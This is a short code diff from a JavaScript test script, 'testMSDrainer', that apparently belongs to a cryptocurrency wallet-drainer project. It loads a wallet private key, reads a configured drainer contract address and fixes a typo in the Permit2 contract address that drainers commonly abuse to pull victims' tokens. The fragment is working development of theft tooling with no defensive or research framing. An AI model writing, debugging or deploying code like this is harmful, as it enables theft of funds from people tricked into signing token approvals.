@@ -7,7 +7,7 @@ async function testMSDrainer() {
     const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
 
     const DRAINER_ADDRESS = process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS;
-    const PERMIT2_ADDRESS = "0x000000000022d473030f116dee9f6b43ac78ba3";
+    const PERMIT2_ADDRESS = "0x000000000022d473030f116ddee9f6b43ac78ba3";
 
     if (!DRAINER_ADDRESS || DRAINER_ADDRESS === "0x0000000000000000000000000000000000000000") {
         console.error("❌ MS Drainer address not configured.");
